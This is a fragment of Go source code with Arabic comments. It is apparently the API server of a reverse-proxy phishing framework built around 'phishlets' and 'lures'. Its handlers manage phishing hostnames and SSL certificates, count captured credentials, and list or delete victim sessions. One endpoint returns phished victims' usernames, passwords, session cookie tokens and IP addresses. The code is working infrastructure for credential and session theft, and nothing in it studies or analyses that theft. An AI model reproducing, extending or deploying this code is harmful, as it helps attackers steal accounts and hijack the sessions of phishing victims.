		err = as.cfg.SetSiteDisabled(hostnameConfig.Phishlet)
		if err != nil {
			stdlib_log.Printf("خطأ أثناء تعطيل الـ phishlet بعد تحديث hostname: %v", err)
		}
	}

	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("تم تحديث hostname للـ phishlet '%s' بنجاح", hostnameConfig.Phishlet),
	})
}

// validateAuthToken للتحقق من صحة توكن المصادقة
func (as *ApiServer) validateAuthToken(token string) bool {
	if token == "" {
		return false
	}
	return token == as.authToken
}

// GetBaseDomain يحصل على النطاق الأساسي من التكوين
func (as *ApiServer) GetBaseDomain() string {
	return as.cfg.GetBaseDomain()
}

// handleHeaders يضيف رؤوس HTTP الضرورية للاستجابة
func (as *ApiServer) handleHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// healthHandler للتحقق من حالة الخادم
func (as *ApiServer) healthHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

// dashboardHandler لإحصائيات لوحة التحكم
func (as *ApiServer) dashboardHandler(w http.ResponseWriter, r *http.Request) {
	// جمع البيانات للوحة التحكم
	phishlets := as.cfg.phishlets
	lures := as.cfg.lures
	
	// الحصول على الجلسات
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, "فشل في استرجاع الجلسات", http.StatusInternalServerError)
		return
	}
	
	// عدد بيانات الاعتماد
	credCount := 0
	for _, session := range sessions {
		if len(session.Username) > 0 || len(session.Password) > 0 {
			credCount++
		}
	}
	
	// تجهيز البيانات
	dashboardData := map[string]interface{}{
		"phishlets_count": len(phishlets),
		"lures_count": len(lures),
		"sessions_count": len(sessions),
		"credentials_count": credCount,
		"recent_sessions": sessions[:min(5, len(sessions))],
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم استرجاع بيانات لوحة التحكم بنجاح",
		Data: dashboardData,
	})
}

// sessionsHandler لجلب قائمة الجلسات
func (as *ApiServer) sessionsHandler(w http.ResponseWriter, r *http.Request) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم استرجاع الجلسات بنجاح",
		Data: sessions,
	})
}

// sessionHandler لجلب تفاصيل جلسة محددة
func (as *ApiServer) sessionHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	// التحقق من طريقة الطلب
	if r.Method == "GET" {
		// الحصول على الجلسة
		sessions, err := as.db.ListSessions()
		if err != nil {
			as.jsonError(w, "فشل في استرجاع الجلسات", http.StatusInternalServerError)
			return
		}
		
		// محاولة تحويل المعرف إلى رقم (إذا كان رقميًا)
		idInt, err := strconv.Atoi(idStr)
		
		// البحث عن الجلسة بالمعرف (نبحث بكلا الطريقتين: المعرف الرقمي والمعرف النصي)
		var session *database.Session
		for _, s := range sessions {
			if (err == nil && s.Id == idInt) || s.SessionId == idStr {
				session = s
				break
			}
		}
		
		if session == nil {
			as.jsonError(w, "الجلسة غير موجودة", http.StatusNotFound)
			return
		}
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: "تم استرجاع تفاصيل الجلسة بنجاح",
			Data: session,
		})
	} else if r.Method == "DELETE" {
		// تحويل المعرف إلى رقم
		sessionId, err := strconv.Atoi(idStr)
		if err != nil {
			as.jsonError(w, "معرف الجلسة غير صالح", http.StatusBadRequest)
			return
		}
		
		// حذف الجلسة
		err = as.db.DeleteSessionById(sessionId)
		if err != nil {
			as.jsonError(w, "فشل في حذف الجلسة: "+err.Error(), http.StatusInternalServerError)
			return
		}
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: "تم حذف الجلسة بنجاح",
		})
	} else {
		as.jsonError(w, "طريقة الطلب غير مدعومة", http.StatusMethodNotAllowed)
	}
}

// credsHandler لجلب بيانات الاعتماد
func (as *ApiServer) credsHandler(w http.ResponseWriter, r *http.Request) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع بيانات الاعتماد", http.StatusInternalServerError)
		return
	}
	
	// استخراج بيانات الاعتماد من الجلسات
	credentials := []map[string]interface{}{}
	for _, session := range sessions {
		if len(session.Username) > 0 || len(session.Password) > 0 {
			cred := map[string]interface{}{
				"id": session.Id,
				"phishlet": session.Phishlet,
				"username": session.Username,
				"password": session.Password,
				"tokens": session.CookieTokens,  // استخدام CookieTokens بدلاً من Tokens
				"remote_addr": session.RemoteAddr,
				"time": session.UpdateTime,
			}
			credentials = append(credentials, cred)
		}
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم استرجاع بيانات الاعتماد بنجاح",
		Data: credentials,
	})
}

// إضافة معالج جديد لحفظ التكوين
func (as *ApiServer) configSaveHandler(w http.ResponseWriter, r *http.Request) {
	// حفظ التكوين
	// هذا سيقوم بحفظ حالة الـ phishlets في ملف التكوين
	as.cfg.SavePhishlets()
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم حفظ التكوين بنجاح",
	})
}

// إضافة معالج تحديث شهادات SSL
func (as *ApiServer) certificatesHandler(w http.ResponseWriter, r *http.Request) {
	// تحديث قائمة hostnames النشطة
	as.cfg.refreshActiveHostnames()
	
	// الحصول على قائمة الـ hostnames النشطة
	active_hosts := as.cfg.GetActiveHostnames("")
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم تحديث شهادات SSL بنجاح. يرجى الانتظار لبضع دقائق لإصدار الشهادات.",
		Data: map[string]interface{}{
			"active_hostnames": active_hosts,
		},
	})
}

// min يقوم بإرجاع الأصغر من بين رقمين
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
} 